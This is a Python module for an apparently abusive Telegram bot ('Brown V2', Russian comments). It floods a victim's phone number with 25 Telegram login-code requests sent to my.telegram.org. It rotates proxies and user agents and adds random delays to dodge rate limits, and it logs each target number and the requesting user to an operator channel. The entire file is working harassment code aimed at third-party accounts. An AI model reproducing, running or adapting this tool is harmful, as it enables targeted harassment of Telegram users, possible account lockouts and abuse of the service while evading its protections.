"""
Brown V2 | code_snos.py
Метод: спам кодами на my.telegram.org/auth/send_password
- 25 запросов, каждый через уникальный прокси (round-robin)
- Задержка 1.5-3с между запросами — не флудит прокси
- Один прокси = максимум 1 запрос за сессию
"""

import asyncio
import os
import random
from datetime import datetime

import aiohttp
from aiohttp_socks import ProxyConnector, ProxyType

LOG_FOLDER = "logs"
os.makedirs(LOG_FOLDER, exist_ok=True)

CODES_COUNT = 25
TIMEOUT = 12
DELAY_MIN = 1.5
DELAY_MAX = 3.0

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 15; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.146 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.115 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3a XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 2 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 2 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.158 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
]

bot = None


def set_bot_code(b):
    global bot
    bot = b


def _load_proxies() -> list[str]:
    path = "proxies.txt"
    if not os.path.exists(path):
        return []
    with open(path, encoding="utf-8") as f:
        lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    return lines


def _build_connector(proxy_url: str):
    """Возвращает (connector_or_None, proxy_str_for_http_or_None)"""
    if proxy_url.startswith("socks5://"):
        host, port = proxy_url[9:].split(":")
        connector = ProxyConnector(
            proxy_type=ProxyType.SOCKS5, host=host, port=int(port), rdns=True
        )
        return connector, None
    elif proxy_url.startswith("socks4://"):
        host, port = proxy_url[9:].split(":")
        connector = ProxyConnector(
            proxy_type=ProxyType.SOCKS4, host=host, port=int(port), rdns=True
        )
        return connector, None
    else:
        # HTTP прокси
        return None, proxy_url


async def _send_one_code(phone: str, proxy_url: str | None, attempt: int, used_uas: set) -> str:
    url = "https://my.telegram.org/auth/send_password"

    # Случайный UA — каждый запрос уникальный, не повторяем уже использованные
    available = [ua for ua in USER_AGENTS if ua not in used_uas]
    if not available:
        available = USER_AGENTS
    ua = random.choice(available)
    used_uas.add(ua)

    headers = {
        "User-Agent": ua,
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://my.telegram.org/auth",
        "Origin": "https://my.telegram.org",
    }
    data = {"phone": phone}

    proxy_label = proxy_url[:35] if proxy_url else "direct"

    try:
        if proxy_url is None:
            connector = aiohttp.TCPConnector(ssl=False)
            proxy_arg = None
        else:
            connector, proxy_arg = _build_connector(proxy_url)
            if connector is None:
                # HTTP — используем стандартный коннектор
                connector = aiohttp.TCPConnector(ssl=False)

        async with aiohttp.ClientSession(connector=connector) as session:
            kwargs = dict(
                data=data,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=TIMEOUT),
                ssl=False,
            )
            if proxy_arg:
                kwargs["proxy"] = proxy_arg

            async with session.post(url, **kwargs) as resp:
                text = (await resp.text())[:80]
                print(f"[CODE] #{attempt:02d} {proxy_label} → {resp.status} | {text}", flush=True)
                if resp.status in (200, 201):
                    return "OK"
                if resp.status == 429:
                    return "FLOOD"
                if resp.status == 400:
                    return "BAD_REQUEST"
                return f"HTTP_{resp.status}"

    except asyncio.TimeoutError:
        print(f"[CODE] #{attempt:02d} {proxy_label} → TIMEOUT", flush=True)
        return "TIMEOUT"
    except Exception as e:
        print(f"[CODE] #{attempt:02d} {proxy_label} → ERR: {str(e)[:60]}", flush=True)
        return "ERROR"


async def main_code_snos(phone: str, user_id: int, username: str):
    from config import bot_logs
    import keyboards
    from aiogram import types as aiogram_types

    proxies = _load_proxies()

    print(f"\n{'='*50}", flush=True)
    print(f"[CODE] 🚀 Запуск code-метода", flush=True)
    print(f"[CODE] 📱 Номер: {phone}", flush=True)
    print(f"[CODE] 👤 {user_id} (@{username})", flush=True)
    print(f"[CODE] 🔗 Прокси: {len(proxies)}", flush=True)
    print(f"[CODE] 🎯 Отправляем {CODES_COUNT} кодов...", flush=True)
    print(f"{'='*50}", flush=True)

    # Равномерное распределение: перемешиваем и берём по кругу
    # Каждый прокси используется максимум ceil(25/len) раз
    if proxies:
        random.shuffle(proxies)
        # Расширяем список если прокси меньше чем CODES_COUNT
        proxy_pool = []
        while len(proxy_pool) < CODES_COUNT:
            proxy_pool.extend(proxies)
        proxy_pool = proxy_pool[:CODES_COUNT]
    else:
        proxy_pool = [None] * CODES_COUNT

    results = []

    # used_uas — отслеживаем использованные UA чтобы не повторяться
    used_uas: set = set()

    # Последовательно с задержкой — не флудим
    for i in range(CODES_COUNT):
        result = await _send_one_code(phone, proxy_pool[i], i + 1, used_uas)
        results.append((proxy_pool[i], result))

        # Задержка между запросами для равномерной нагрузки
        if i < CODES_COUNT - 1:
            delay = random.uniform(DELAY_MIN, DELAY_MAX)
            await asyncio.sleep(delay)

    ok = sum(1 for _, r in results if r == "OK")
    flood = sum(1 for _, r in results if r == "FLOOD")
    err = sum(1 for _, r in results if r not in ("OK", "FLOOD"))

    print(f"\n[CODE] {'='*50}", flush=True)
    print(f"[CODE] 🏁 Итоги: ✅ {ok} | 🌊 {flood} | ❌ {err}", flush=True)
    print(f"[CODE] {'='*50}\n", flush=True)

    # Лог
    log_lines = [
        "Brown V2 log | code-method",
        "-" * 42,
        f"Пользователь: {user_id} (@{username})",
        f"Номер: {phone}",
        f"Всего запросов: {CODES_COUNT}",
        f"Прокси использовано: {len(set(p for p, _ in results if p))}",
        "-" * 42,
    ]
    for i, (proxy, status) in enumerate(results, 1):
        p_label = proxy[:40] if proxy else "direct"
        log_lines.append(
            f"[{datetime.now().strftime('%H:%M:%S')}] #{i:02d} {p_label} → {status}"
        )
    log_lines += [
        "-" * 42,
        f"✅ Успешно: {ok}",
        f"🌊 Флуд: {flood}",
        f"❌ Ошибок: {err}",
    ]

    log_name = f"brown_v2_code_log_{os.urandom(6).hex()}.txt"
    log_path = os.path.join(LOG_FOLDER, log_name)
    with open(log_path, "w", encoding="utf-8") as f:
        f.write("\n".join(log_lines))

    caption_user = (
        f"📱 *Код-метод завершён\!*\n"
        f"*└─ Номер:* `{phone}`\n\n"
        f"✅ *Отправлено кодов: {ok}/{CODES_COUNT}*\n"
        f"🌊 *Флуд: {flood}*\n"
        f"❌ *Ошибок: {err}*"
    )
    caption_log = (
        f"📱 *code\-method*\n"
        f"*└─ Номер:* `{phone}`\n\n"
        f"✅ {ok} | 🌊 {flood} | ❌ {err}\n"
        f"👤 {user_id} \(@{username}\)"
    )

    try:
        await bot.send_document(
            user_id, aiogram_types.InputFile(log_path),
            caption=caption_user, parse_mode="MarkdownV2",
            reply_markup=keyboards.main_menu
        )
        await bot.send_document(
            bot_logs, aiogram_types.InputFile(log_path),
            caption=caption_log, parse_mode="MarkdownV2"
        )
    except Exception as e:
        print(f"[CODE] Ошибка отправки лога: {e}", flush=True)

    try:
        os.remove(log_path)
    except Exception:
        pass
